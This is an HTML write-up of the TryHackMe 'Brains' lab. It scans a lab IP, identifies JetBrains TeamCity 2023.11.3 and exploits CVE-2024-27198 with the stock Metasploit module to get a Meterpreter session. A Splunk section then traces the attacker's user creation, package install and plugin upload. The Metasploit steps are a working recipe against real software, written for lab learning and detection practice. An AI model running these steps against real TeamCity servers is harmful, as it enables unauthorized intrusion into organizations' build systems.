  <h1>TryHackMe: Brains Write-up</h1>
  <p>Cybersecurity often begins with a single thread — an IP address, a service banner, or a version number. The <em>Brains</em> room on TryHackMe invites you to pull that thread and see what unravels.</p>
  <p>This room simulates a real-world attack scenario against a vulnerable CI/CD platform: JetBrains TeamCity. You begin with just a target IP and no context. Your goal is to perform reconnaissance, discover a known critical vulnerability, exploit it to gain access, and then pivot into a Blue Team role to analyze how such an attack would be detected using Splunk logs.</p>
  <p>It’s designed for learners of all levels, but especially helpful for those looking to connect theory to practice. If you’re studying for the Security+, OSCP, or just want to understand attacker methodology in a safe lab, this room offers a structured experience grounded in real-world tactics.</p>
</header>

<section>
  <h2>Step 1: Discovering the Attack Surface</h2>
  <p>We begin with the target: <code>10.10.164.206</code>. Our first action is scanning for open ports using <code>nmap</code>:</p>
  <pre>nmap 10.10.164.206</pre>
  <p>Results:</p>
  <ul>
    <li><strong>22/tcp (SSH)</strong> – Secure shell, possibly for admin access.</li>
    <li><strong>80/tcp (HTTP)</strong> – Default web server, worth visiting.</li>
    <li><strong>50000/tcp</strong> – A high web port, which often reveals hidden or administrative services.</li>
  </ul>
  <p>This reconnaissance phase is about defining the exposed attack surface, just like in the initial stages of the Cyber Kill Chain.</p>
</section>

<section>
  <h2>Step 2: Exploring and Identifying the Target</h2>
  <p>I began visiting the exposed services in my browser.</p>
  <ul>
    <li><strong>SSH</strong>: Blocked. No credentials. No brute force.</li>
    <li><strong>HTTP (80)</strong>: A default maintenance page. The source code was clean. No JavaScript tricks, no hints.</li>
    <li><strong>HTTP (50000)</strong>: Jackpot. The login page of JetBrains TeamCity was exposed. In the footer, I found the version: <strong>2023.11.3 (build 147512)</strong>.</li>
  </ul>
  <p>Why this matters? Knowing the exact software version is crucial. It lets you look up public vulnerabilities and match them to real-world exploits.</p>
</section>

<section>
  <h2>Step 3: Vulnerability Research</h2>
  <p>After identifying TeamCity <strong>2023.11.3</strong>, I first did a quick search on Google to check if anything obvious came up. Then I went to trusted databases like the <a href="https://nvd.nist.gov/" target="_blank">NVD</a> and <a href="https://cve.org" target="_blank">CVE.org</a>. I used queries like:</p>
  <pre>"TeamCity 2023.11.3"</pre>
  <p>This quickly led me to <strong>CVE-2024-27198</strong> — an <em>authentication bypass vulnerability</em> with a CVSS score of 9.8. This vulnerability allows attackers to bypass login and interact directly with internal server endpoints, enabling remote code execution (RCE).</p>
  <p>This stage maps directly to the <strong>weaponization</strong> phase in the Cyber Kill Chain. I now had a known, critical vulnerability to exploit—verified and confirmed by the version I discovered earlier.</p>
</section>

<section>
  <h2>Step 4: Exploiting with Metasploit</h2>
  <p>With the vulnerability verified, I switched to my attacker box running Kali Linux and launched Metasploit:</p>
  <pre>msfconsole</pre>
  <p>I searched for the exploit module using the CVE identifier:</p>
  <pre>search CVE-2024-27198</pre>
  <p>I select the exploit module it returned (option 0) and use it:</p>
  <pre>use 0</pre>
  <p>To fully understand the module, I ran:</p>
  <pre>info</pre>
  <p>Then I set the remote target IP and port:</p>
  <pre>set RHOSTS 10.10.164.206
set RPORT 50000</pre>
  <p>Finally, I launched the exploit:</p>
  <pre>run</pre>
  <p>This provided a Meterpreter session as the <code>ubuntu</code> user. I validated my access with:</p>
  <pre>cat /home/ubuntu/flag.txt</pre>
</section>

<section>
  <h2>Step 5: Defensive Detection with Splunk</h2>
  <p>Now on the Blue Team side, I accessed Splunk to see what traces the attack had left behind.</p>
  <h3>1. Suspicious User Creation</h3>
  <pre>source="/var/log/auth.log" useradd</pre>
  <p>This showed a new user was added right after the exploit was run. Likely for persistence.</p>
  <h3>2. Unusual Package Installation</h3>
  <pre>source="/var/log/dpkg.log" date_month="july" date_mday="4" install</pre>
  <p>Here, a suspicious package not part of the base install was added. Possibly a backdoor.</p>
  <h3>3. Plugin Upload in TeamCity</h3>
  <pre>source="/opt/teamcity/TeamCity/logs/teamcity-activities.log" plugin</pre>
  <p>This confirmed a plugin was uploaded—likely the method used to deliver the payload.</p>

  <h2>Final Thoughts</h2>
  <p>This room highlights the full lifecycle of a cyberattack—from discovering the surface to exploiting it and tracing the aftermath. It's a compact simulation of how red team operations evolve and how blue teams detect and respond.</p>
  <p>It reinforced the importance of curiosity and persistence. I didn’t know everything up front—I had to research the CVE, look up Metasploit syntax, and run queries in Splunk I hadn’t tried before. But step by step, it came together.</p>
  <p>What really helped was watching breakdowns of similar rooms on YouTube. Seeing how others think, troubleshoot, and explain their process made all the difference. I recommend taking the same approach: combine hands-on with community resources to strengthen both your offensive and defensive skills.</p>
  <p>Security isn't just about tools—it's about how you approach problems, how you document your findings, and how you improve each time. Keep iterating. Each room, each lab, is another level up.</p>
